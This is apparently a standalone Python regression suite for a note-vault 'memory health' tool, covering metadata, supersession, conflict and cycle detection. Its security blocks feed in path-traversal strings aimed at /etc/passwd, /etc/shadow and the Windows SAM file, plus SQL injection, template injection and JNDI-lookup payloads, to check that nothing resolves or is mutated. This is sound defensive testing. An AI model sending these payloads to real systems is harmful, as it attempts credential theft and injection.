#!/usr/bin/env python3
"""Dedicated regression suite for the memory health/coverage layer
(tools/memory_health.py), built on top of tools/memory_runtime.py,
tools/memory_conflict.py, tools/memory_provenance.py, and
tools/audit_job_dependencies.py.

Standalone, self-contained, no pytest — matches the sibling suites'
convention: run directly (`python tests/test_memory_health.py`), collects a
problems list, prints PASS/FAILED, exits 0/1. Covers the 24 requested
regression scenarios plus the 10 security invariants (folded into the
scenario that already exercises each, or a dedicated final security block
where no single scenario naturally covers one).
"""
from __future__ import annotations

import hashlib
import sys
import tempfile
from datetime import date
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
TOOLS = REPO / "tools"
MAIN_FIXTURES = REPO / "tests" / "fixtures" / "vaults"

sys.path.insert(0, str(TOOLS))
sys.path.insert(0, str(MAIN_FIXTURES))

import memory_runtime as rt  # noqa: E402
import memory_health as mh  # noqa: E402
import build_fixtures as bf  # noqa: E402

TODAY = date(2026, 8, 30)
PROBLEMS = []


def check(label: str, condition: bool, detail: str = ""):
    if not condition:
        PROBLEMS.append("%s%s" % (label, (": " + detail) if detail else ""))


def note(memory_status=None, extra="", title="Note", project="personal"):
    lines = ["---", "status: active", "project: %s" % project, "type: reference"]
    if memory_status:
        lines.append("memory_status: %s" % memory_status)
    if extra:
        lines.append(extra.strip())
    lines += ["---", "# %s" % title, ""]
    return "\n".join(lines)


def build_vault(tmp: Path, name: str, files: dict) -> Path:
    root = tmp / name
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8", newline="\n")
    return root


def file_hashes(root: Path) -> dict:
    out = {}
    for p in sorted(root.rglob("*")):
        if p.is_file():
            out[str(p.relative_to(root))] = hashlib.sha256(p.read_bytes()).hexdigest()
    return out


def by_id(findings, finding_id):
    return [f for f in findings if f.finding_id == finding_id]


def by_severity(findings, severity):
    return [f for f in findings if f.severity == severity]


def main() -> int:
    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)

        # ============================================================
        # 1 — completely healthy current memory (cleanly linked, no gaps)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/healthy-a.md"] = note("current", "last_confirmed: 2026-08-29", "Healthy A") + "\nSee [[healthy-b]].\n"
        files["00 - Inbox/healthy-b.md"] = note("current", "last_confirmed: 2026-08-29", "Healthy B") + "\nSee [[healthy-a]].\n"
        v1 = build_vault(tmp, "v1", files)
        rt1 = rt.MemoryRuntime(v1)
        rep1 = mh.assess(rt1, "00 - Inbox/healthy-a")
        check("1. status resolved", rep1.status == "resolved", "got %r" % (rep1.status,))
        check("1. completely healthy note produces zero blocking/warning findings",
              by_severity(rep1.findings, "blocking") == [] and by_severity(rep1.findings, "warning") == [],
              "got %r" % (rep1.findings,))

        # ============================================================
        # 2 — malformed metadata
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/broken.md"] = """---
status: active
project: personal
type: [broken
---
# Broken
"""
        v2 = build_vault(tmp, "v2", files)
        rt2 = rt.MemoryRuntime(v2)
        rep2 = mh.assess(rt2, "00 - Inbox/broken")
        check("2. malformed_metadata finding present", len(by_id(rep2.findings, "malformed_metadata")) == 1,
              "got %r" % (rep2.findings,))
        check("2. malformed metadata is warning, not blocking (standalone, not tied to a Required dependency)",
              by_id(rep2.findings, "malformed_metadata")[0].severity == "warning")

        # ============================================================
        # 3 — disputed memory
        # ============================================================
        files = bf.base_files()
        old_bullet = (
            "- **`memory_status`** — `active` (a current, working fact) | `stale` "
            "(was current, not recent) | `archived` (a fact no longer operative, kept for history)."
        )
        files["VAULT-INDEX.md"] = files["VAULT-INDEX.md"].replace(bf.MEMORY_STATUS_BULLET, old_bullet)
        files["00 - Inbox/disputed-thing.md"] = note("active", title="Disputed Thing")
        v3 = build_vault(tmp, "v3", files)
        rt3 = rt.MemoryRuntime(v3)
        check("3. fixture actually produces disputed vocabulary (sanity check)",
              "active" in rt3.vault.disputed_terms, "got %r" % (rt3.vault.disputed_terms,))
        rep3 = mh.assess(rt3, "00 - Inbox/disputed-thing")
        check("3. disputed_memory finding present", len(by_id(rep3.findings, "disputed_memory")) == 1,
              "got %r" % (rep3.findings,))
        check("3. disputed memory is warning severity", by_id(rep3.findings, "disputed_memory")[0].severity == "warning")

        # ============================================================
        # 4 — candidate memory (coherent on its own; not a defect by itself)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/a-candidate.md"] = note("candidate", "source: inferred\nconfidence: low", "A Candidate")
        v4 = build_vault(tmp, "v4", files)
        rt4 = rt.MemoryRuntime(v4)
        rep4 = mh.assess(rt4, "00 - Inbox/a-candidate")
        check("4. candidate alone -> no malformed/disputed/conflicting finding",
              by_id(rep4.findings, "malformed_metadata") == [] and by_id(rep4.findings, "disputed_memory") == []
              and by_id(rep4.findings, "conflicting_identity") == [])
        check("4. subject correctly labeled candidate, not promoted",
              rep4.subject.status_track == "candidate" and rep4.subject.accepted is False)

        # ============================================================
        # 5 — superseded memory, cleanly linked (coherent, not a defect)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/old-fact.md"] = note("superseded", 'superseded_by: "[[new-fact]]"', "Old Fact")
        files["00 - Inbox/new-fact.md"] = note("current", 'supersedes: "[[old-fact]]"\nlast_confirmed: 2026-08-29', "New Fact")
        v5 = build_vault(tmp, "v5", files)
        rt5 = rt.MemoryRuntime(v5)
        rep5 = mh.assess(rt5, "00 - Inbox/old-fact")
        check("5. cleanly-linked superseded note -> no supersession_inconsistency finding",
              by_id(rep5.findings, "supersession_inconsistency") == [], "got %r" % (rep5.findings,))
        check("5. subject correctly labeled superseded",
              rep5.subject.status_track == "superseded" and rep5.subject.accepted is False)

        # ============================================================
        # 6 — missing Required Job dependency
        # ============================================================
        files = bf.base_files()
        files["09 - Resources/Jobs/Job6.md"] = (
            note("current", title="Job6") + "\n## Context\n\n**Required:** [[does-not-exist]] (claim)\n"
            "**Preferred:** none\n**Optional:** none\n"
        )
        v6 = build_vault(tmp, "v6", files)
        rt6 = rt.MemoryRuntime(v6)
        rep6 = mh.assess(rt6, "09 - Resources/Jobs/Job6", today=TODAY)
        check("6. missing_required_dependency finding present, blocking",
              len(by_id(rep6.findings, "missing_required_dependency")) >= 1
              and by_id(rep6.findings, "missing_required_dependency")[0].severity == "blocking",
              "got %r" % (rep6.findings,))

        # ============================================================
        # 7 — ambiguous Required Job dependency
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/amb-dep.md"] = note("current", title="Amb Dep A")
        files["02 - Projects/amb-dep.md"] = note("current", title="Amb Dep B")
        files["09 - Resources/Jobs/Job7.md"] = (
            note("current", title="Job7") + "\n## Context\n\n**Required:** [[amb-dep]] (claim)\n"
            "**Preferred:** none\n**Optional:** none\n"
        )
        v7 = build_vault(tmp, "v7", files)
        rt7 = rt.MemoryRuntime(v7)
        rep7 = mh.assess(rt7, "09 - Resources/Jobs/Job7", today=TODAY)
        amb = by_id(rep7.findings, "ambiguous_identity")
        check("7. ambiguous_identity finding present for the Required dependency, blocking",
              len(amb) >= 1 and any(f.severity == "blocking" for f in amb), "got %r" % (rep7.findings,))

        # ============================================================
        # 8 — Preferred failure without Required failure
        # ============================================================
        files = bf.base_files()
        files["09 - Resources/dep-ok.md"] = note("current", "last_confirmed: 2026-08-29", "Dep OK")
        files["09 - Resources/Jobs/Job8.md"] = (
            note("current", title="Job8") + "\n## Context\n\n**Required:** [[dep-ok]] (claim)\n"
            "**Preferred:** [[does-not-exist-pref]] (claim)\n**Optional:** none\n"
        )
        v8 = build_vault(tmp, "v8", files)
        rt8 = rt.MemoryRuntime(v8)
        rep8 = mh.assess(rt8, "09 - Resources/Jobs/Job8", today=TODAY)
        check("8. Preferred failure produces no blocking finding at all",
              by_severity(rep8.findings, "blocking") == [], "got %r" % (rep8.findings,))
        check("8. Preferred failure surfaces as a warning-level broken_reference",
              any(f.finding_id == "broken_reference" and f.severity == "warning" for f in rep8.findings),
              "got %r" % (rep8.findings,))

        # ============================================================
        # 9 — Optional failure without Required failure (silent by default,
        # informational only when explicitly requested)
        # ============================================================
        files = bf.base_files()
        files["09 - Resources/dep-ok2.md"] = note("current", "last_confirmed: 2026-08-29", "Dep OK 2")
        files["09 - Resources/Jobs/Job9.md"] = (
            note("current", title="Job9") + "\n## Context\n\n**Required:** [[dep-ok2]] (claim)\n"
            "**Preferred:** none\n**Optional:** [[does-not-exist-opt]] (claim)\n"
        )
        v9 = build_vault(tmp, "v9", files)
        rt9 = rt.MemoryRuntime(v9)
        rep9_quiet = mh.assess(rt9, "09 - Resources/Jobs/Job9", show_optional=False, today=TODAY)
        check("9. Optional failure silent by default (no finding at all)",
              rep9_quiet.findings == (), "got %r" % (rep9_quiet.findings,))
        rep9_loud = mh.assess(rt9, "09 - Resources/Jobs/Job9", show_optional=True, today=TODAY)
        check("9. Optional failure, when requested, is informational only — never blocking/warning",
              rep9_loud.findings and all(f.severity == "informational" for f in rep9_loud.findings),
              "got %r" % (rep9_loud.findings,))

        # ============================================================
        # 10 — supersession inconsistency (current + superseded, no link)
        # ============================================================
        files = bf.base_files()
        files["09 - Resources/fact.md"] = note("current", "last_confirmed: 2026-08-29", "Fact Current")
        files["00 - Inbox/fact.md"] = note("superseded", title="Fact Old, No Link")
        v10 = build_vault(tmp, "v10", files)
        rt10 = rt.MemoryRuntime(v10)
        rep10 = mh.assess(rt10, "09 - Resources/fact")
        check("10. supersession_inconsistency finding present, warning",
              len(by_id(rep10.findings, "supersession_inconsistency")) == 1
              and by_id(rep10.findings, "supersession_inconsistency")[0].severity == "warning",
              "got %r" % (rep10.findings,))

        # ============================================================
        # 11 — confirmed conflict (mutual supersedes, 2-node cycle) is
        # reported exactly once, as cycle_detected, not double-counted
        # against conflict's own confirmed_conflict category
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/left.md"] = note("current", 'supersedes: "[[right]]"', "Left")
        files["00 - Inbox/right.md"] = note("current", 'supersedes: "[[left]]"', "Right")
        v11 = build_vault(tmp, "v11", files)
        rt11 = rt.MemoryRuntime(v11)
        rep11 = mh.assess(rt11, "00 - Inbox/left")
        check("11. confirmed conflict (mutual supersedes) surfaces exactly once, as cycle_detected",
              len(by_id(rep11.findings, "cycle_detected")) == 1, "got %r" % (rep11.findings,))
        check("11. cycle_detected is blocking", by_id(rep11.findings, "cycle_detected")[0].severity == "blocking")

        # ============================================================
        # 12 — potential conflict (two current, same stem, no link)
        # ============================================================
        files = bf.base_files()
        files["09 - Resources/dup.md"] = note("current", "last_confirmed: 2026-08-29", "Dup A")
        files["00 - Inbox/dup.md"] = note("current", "last_confirmed: 2026-08-29", "Dup B")
        v12 = build_vault(tmp, "v12", files)
        rt12 = rt.MemoryRuntime(v12)
        rep12 = mh.assess(rt12, "09 - Resources/dup")
        check("12. conflicting_identity finding present, warning",
              len(by_id(rep12.findings, "conflicting_identity")) == 1
              and by_id(rep12.findings, "conflicting_identity")[0].severity == "warning",
              "got %r" % (rep12.findings,))

        # ============================================================
        # 13 — compatible supersession produces NO finding at all
        # ============================================================
        rep13 = mh.assess(rt5, "00 - Inbox/new-fact")
        check("13. clean reciprocated supersession produces no conflict-derived finding",
              by_id(rep13.findings, "conflicting_identity") == []
              and by_id(rep13.findings, "supersession_inconsistency") == [])

        # ============================================================
        # 14/15 — broken and ambiguous provenance edges
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/amb-target.md"] = note("current", title="Amb Target A")
        files["02 - Projects/amb-target.md"] = note("current", title="Amb Target B")
        files["00 - Inbox/edge-src.md"] = (
            note("current", title="Edge Src") + "\nSee [[does-not-exist-edge]] and [[amb-target]].\n"
        )
        v14 = build_vault(tmp, "v14", files)
        rt14 = rt.MemoryRuntime(v14)
        rep14 = mh.assess(rt14, "00 - Inbox/edge-src")
        broken_findings = by_id(rep14.findings, "broken_reference")
        check("14. broken (missing) provenance edge -> broken_reference/warning",
              any(f.details.get("reason") == "missing" for f in broken_findings), "got %r" % (broken_findings,))
        check("15. ambiguous provenance edge -> broken_reference/warning",
              any(f.details.get("reason") == "ambiguous" for f in broken_findings), "got %r" % (broken_findings,))
        check("14/15. unresolved_provenance rollup present",
              len(by_id(rep14.findings, "unresolved_provenance")) == 1, "got %r" % (rep14.findings,))

        # ============================================================
        # 16 — cycle (4-node), correct members, correct severity
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/x.md"] = note("current", 'supersedes: "[[y]]"', "X")
        files["00 - Inbox/y.md"] = note("current", 'supersedes: "[[z]]"', "Y")
        files["00 - Inbox/z.md"] = note("current", 'supersedes: "[[w]]"', "Z")
        files["00 - Inbox/w.md"] = note("current", 'supersedes: "[[x]]"', "W")
        v16 = build_vault(tmp, "v16", files)
        rt16 = rt.MemoryRuntime(v16)
        rep16 = mh.assess(rt16, "x")
        cyc16 = by_id(rep16.findings, "cycle_detected")
        check("16. cycle_detected present with all 4 members", cyc16 and
              set(cyc16[0].details.get("members", [])) == {"00 - Inbox/x.md", "00 - Inbox/y.md",
                                                              "00 - Inbox/z.md", "00 - Inbox/w.md"},
              "got %r" % (cyc16,))

        # ============================================================
        # 17/18/19 — isolated note (both directions) vs one-directional
        # informational cases
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/isolated.md"] = note("current", "last_confirmed: 2026-08-29", "Isolated")
        files["00 - Inbox/only-out.md"] = note("current", title="Only Out") + "\nSee [[only-in]].\n"
        files["00 - Inbox/only-in.md"] = note("current", "last_confirmed: 2026-08-29", "Only In")
        v1719 = build_vault(tmp, "v1719", files)
        rt1719 = rt.MemoryRuntime(v1719)
        rep_iso = mh.assess(rt1719, "00 - Inbox/isolated")
        check("17. fully isolated note -> orphaned_memory/informational only",
              len(by_id(rep_iso.findings, "orphaned_memory")) == 1
              and by_severity(rep_iso.findings, "blocking") == [] and by_severity(rep_iso.findings, "warning") == [],
              "got %r" % (rep_iso.findings,))
        rep_out = mh.assess(rt1719, "00 - Inbox/only-out")
        check("18. note with outbound-only edges is NOT reported orphaned (has outgoing)",
              by_id(rep_out.findings, "orphaned_memory") == [], "got %r" % (rep_out.findings,))
        rep_in = mh.assess(rt1719, "00 - Inbox/only-in")
        check("19. note with inbound-only edges is NOT reported orphaned (has incoming)",
              by_id(rep_in.findings, "orphaned_memory") == [], "got %r" % (rep_in.findings,))
        cov1719 = mh.coverage(rt1719)
        check("18. vault-wide coverage counts the inbound-less note",
              cov1719.notes_no_inbound >= 1, "got %r" % (cov1719.notes_no_inbound,))
        check("19. vault-wide coverage counts the outbound-less note",
              cov1719.notes_no_outbound >= 1, "got %r" % (cov1719.notes_no_outbound,))

        # ============================================================
        # 20 — retrieval-ranked candidate remains unaccepted regardless of
        # lexical prominence (security invariant 5 folded in here)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/loud-candidate.md"] = (
            note("candidate", "source: inferred\nconfidence: low", "Loud Candidate") + "\n" + ("trustme " * 50) + "\n"
        )
        files["09 - Resources/quiet-current.md"] = note("current", "last_confirmed: 2026-08-29", "Quiet Current") + "\ntrustme once.\n"
        v20 = build_vault(tmp, "v20", files)
        rt20 = rt.MemoryRuntime(v20)
        rep20 = mh.assess(rt20, "00 - Inbox/loud-candidate")
        check("20. lexically-loud candidate stays labeled candidate, never accepted",
              rep20.subject.status_track == "candidate" and rep20.subject.accepted is False,
              "got %r" % (rep20.subject,))
        check("20/sec5. no finding for this note is escalated to blocking by lexical volume alone",
              by_severity(rep20.findings, "blocking") == [], "got %r" % (rep20.findings,))

        # ============================================================
        # 21 — path-qualified target resolves precisely despite a same-stem
        # decoy (security invariant 1)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/required-source.md"] = note("current", "last_confirmed: 2026-08-29", "Decoy Current")
        files["09 - Resources/required-source.md"] = note("superseded", title="Declared Target Superseded")
        v21 = build_vault(tmp, "v21", files)
        rt21 = rt.MemoryRuntime(v21)
        rep21 = mh.assess(rt21, "09 - Resources/required-source")
        check("21. path-qualified target resolves to the declared note, not the decoy",
              rep21.status == "resolved" and rep21.subject.note_path == "09 - Resources/required-source.md",
              "got %r" % (rep21.subject,))
        check("21. declared target's own lifecycle (superseded) preserved, never swapped for the decoy's",
              rep21.subject.status_track == "superseded", "got %r" % (rep21.subject,))

        # ============================================================
        # 22 — traversal-shaped identity (security invariant 7)
        # ============================================================
        traversal_queries = ["../../../../etc/passwd", "/etc/passwd", "C:\\Windows\\System32\\config\\SAM",
                              "..\\..\\..\\Windows", "..", "../"]
        for q in traversal_queries:
            rep_t = mh.assess(rt1, q)
            check("22. traversal-shaped identity %r -> status=missing" % q, rep_t.status == "missing",
                  "got %r" % (rep_t.status,))
            check("22. no findings fabricated for a missing target", rep_t.findings == ())

        # ============================================================
        # 2 — ambiguous identity does not become a guessed result
        # (security invariant 2)
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/twin.md"] = note("current", title="Twin A")
        files["02 - Projects/twin.md"] = note("current", title="Twin B")
        v_twin = build_vault(tmp, "v-twin", files)
        rt_twin = rt.MemoryRuntime(v_twin)
        rep_twin = mh.assess(rt_twin, "twin")
        check("sec2. ambiguous identity -> status=ambiguous, never a guess", rep_twin.status == "ambiguous",
              "got %r" % (rep_twin.status,))
        check("sec2. ambiguous identity produces exactly one blocking finding, no subject picked",
              rep_twin.subject is None and len(by_severity(rep_twin.findings, "blocking")) == 1,
              "got %r" % (rep_twin,))

        # ============================================================
        # 23/24 — deterministic repeated assessment + Vault byte identity
        # ============================================================
        before_v16 = file_hashes(v16)
        rt16b = rt.MemoryRuntime(v16)
        rep16b = mh.assess(rt16b, "x")
        after_v16 = file_hashes(v16)
        order_a = [(f.finding_id, f.subject.note_path if f.subject else None, f.detection_method) for f in rep16.findings]
        order_b = [(f.finding_id, f.subject.note_path if f.subject else None, f.detection_method) for f in rep16b.findings]
        check("23. deterministic repeated assessment: identical finding ordering across independent runs",
              order_a == order_b, "got %r vs %r" % (order_a, order_b))
        check("24. assessing does not mutate the vault", before_v16 == after_v16,
              "changed: %r" % ({k for k in before_v16 if before_v16.get(k) != after_v16.get(k)},))

        cov_v16_a = mh.coverage(rt16)
        cov_v16_b = mh.coverage(rt16b)
        check("23. vault-wide coverage is identical across independent runs",
              vars(cov_v16_a) == vars(cov_v16_b) if hasattr(cov_v16_a, "__dict__") else cov_v16_a == cov_v16_b)

        # ============================================================
        # Vault-wide assess (target=None): coverage sanity + determinism
        # ============================================================
        rep_vault = mh.assess(rt16)
        check("vault-wide status is 'vault'", rep_vault.status == "vault")
        check("vault-wide coverage populated", rep_vault.coverage is not None and rep_vault.coverage.notes_discovered > 0)
        check("vault-wide findings include the cycle exactly once (deduped across all 4 members' own traces)",
              len(by_id(rep_vault.findings, "cycle_detected")) == 1, "got %r" % (by_id(rep_vault.findings, "cycle_detected"),))

        # ============================================================
        # Security invariant 3/4 — candidate/superseded cannot become
        # current through repeated health assessment
        # ============================================================
        for _ in range(3):
            r = mh.assess(rt4, "00 - Inbox/a-candidate")
            check("sec3. candidate never flips to current across repeated assessment",
                  r.subject.status_track == "candidate" and r.subject.accepted is False)
        for _ in range(3):
            r = mh.assess(rt5, "00 - Inbox/old-fact")
            check("sec4. superseded never flips to current across repeated assessment",
                  r.subject.status_track == "superseded" and r.subject.accepted is False)

        # ============================================================
        # Security invariant 6 — lexical overlap alone never creates a
        # blocking (or any) finding between two otherwise-unrelated notes
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/kw-a.md"] = note("current", title="KW A") + "\nThe quokka eats apples in the afternoon.\n"
        files["00 - Inbox/kw-b.md"] = note("current", title="KW B") + "\nA different quokka story about apples entirely.\n"
        v_kw = build_vault(tmp, "v-kw", files)
        rt_kw = rt.MemoryRuntime(v_kw)
        rep_kw = mh.assess(rt_kw, "00 - Inbox/kw-a")
        check("sec6. lexical overlap alone -> zero findings referencing the other note",
              not any(r.note_path == "00 - Inbox/kw-b.md" for f in rep_kw.findings for r in f.related),
              "got %r" % (rep_kw.findings,))

        # ============================================================
        # Security invariant 8/9 — malicious query strings across every
        # vault built so far never mutate anything
        # ============================================================
        malicious = ["'; DROP TABLE notes; --", "{{7*7}}", "${jndi:ldap://evil/a}", "\x00", "../../../../../../etc/shadow"]
        for label, root, runtime_obj in (("v1", v1, rt1), ("v16", v16, rt16), ("v_twin", v_twin, rt_twin)):
            b = file_hashes(root)
            for q in malicious:
                try:
                    mh.assess(runtime_obj, q)
                except Exception as exc:  # noqa: BLE001 — a crash is itself a finding here
                    check("sec8. assess(%r) on %s must not raise" % (q, label), False, "raised %r" % (exc,))
            a = file_hashes(root)
            check("sec9. malicious queries never mutate %s" % label, b == a,
                  "changed: %r" % ({k for k in b if b.get(k) != a.get(k)},))

        # ============================================================
        # Security: no result path ever escapes its vault root; no dataclass
        # anywhere in this module exposes a numeric score/trust field
        # ============================================================
        for report, root in ((rep1, v1), (rep14, v14), (rep16, v16)):
            for f in report.findings:
                subjects = [f.subject] if f.subject else []
                subjects += list(f.related)
                for s in subjects:
                    resolved = (root / s.note_path).resolve()
                    check("security: finding subject/related path stays inside vault root: %r" % s.note_path,
                          str(resolved).startswith(str(root.resolve())), "escaped to %r" % (resolved,))
        for obj in (mh.HealthFinding, mh.CoverageSummary):
            fields = obj.__dataclass_fields__
            check("security: %s carries no numeric 'score'/'confidence_score'/'truth_score' field" % obj.__name__,
                  "score" not in fields and "truth_score" not in fields and "confidence_score" not in fields,
                  "got fields %r" % (list(fields),))
        check("security: severity vocabulary is exactly the three declared values, nothing else, anywhere",
              all(f.severity in mh.SEVERITIES for report in (rep1, rep2, rep3, rep6, rep7, rep8, rep9_loud, rep11,
                                                               rep12, rep14, rep16, rep_vault)
                  for f in report.findings))
        check("security: recommended_action is always drawn from the fixed vocabulary, never 'delete'/'promote'/'demote'",
              all(f.recommended_action in mh.RECOMMENDED_ACTIONS for report in (rep1, rep2, rep3, rep6, rep7, rep8,
                                                                                  rep9_loud, rep11, rep12, rep14, rep16)
                  for f in report.findings))

        source_text = (TOOLS / "memory_health.py").read_text(encoding="utf-8")
        check("security: no method ever opens a path for writing (source check)",
              "write_text(" not in source_text and "unlink(" not in source_text
              and '"w")' not in source_text and "'w')" not in source_text)

    if PROBLEMS:
        print("FAILED (%d):" % len(PROBLEMS))
        for p in PROBLEMS:
            print("  - %s" % p)
        return 1
    print("PASS: memory health/coverage — all 24 scenarios + 10 security invariants hold")
    return 0


if __name__ == "__main__":
    sys.exit(main())
